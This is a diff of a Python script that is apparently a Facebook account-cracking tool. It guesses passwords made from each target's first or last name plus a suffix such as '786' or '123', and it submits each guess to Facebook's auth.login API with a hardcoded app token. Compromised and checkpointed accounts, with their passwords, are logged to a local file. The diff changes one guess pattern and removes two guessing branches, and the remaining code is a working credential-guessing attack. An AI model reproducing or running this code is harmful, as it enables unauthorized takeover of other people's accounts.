@@ -1375,7 +1375,7 @@ def pilih_pakis():
 													cek.close()
 													cekpoint.append(zowe)
 												else:
-													bos6 = j['last_name'].lower()+'786'
+													bos6 = j['first_name'].lower()+'786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													ko = json.load(data)
 													if 'access_token' in ko:
@@ -1396,53 +1396,7 @@ def pilih_pakis():
 															cek = open("done/pakis.txt", "a")
 															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
 															cek.close()
-															cekpoint.append(zowe)
-														else:
-															bos7 = j['last_name'].lower()+'123'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															ko = json.load(data)
-															if 'access_token' in ko:
-																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
-																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
-																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
-																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
-																oke = open("done/pakis.txt", "a")
-																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
-																oke.close()
-																oks.append(zowe)
-															else:
-																if 'www.facebook.com' in ko['error_msg']:
-																	print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
-																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
-																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
-																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos7
-																	cek = open("done/pakis.txt", "a")
-																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
-																	cek.close()
-																	cekpoint.append(zowe)
-																else:
-																	bos8 = j['last_name'].lower()+'1234'
-																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-																	ko = json.load(data)
-																	if 'access_token' in ko:
-																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
-																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
-																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
-																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
-																		oke = open("done/pakis.txt", "a")
-																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
-																		oke.close()
-																		oks.append(zowe)
-																	else:
-																		if 'www.facebook.com' in ko['error_msg']:
-																			print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
-																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
-																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
-																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos8
-																			cek = open("done/pakis.txt", "a")
-																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
-																			cek.close()
-																			cekpoint.append(zowe)
+															cekpoint.append(zowe) 
 																			
 		except:
 			pass
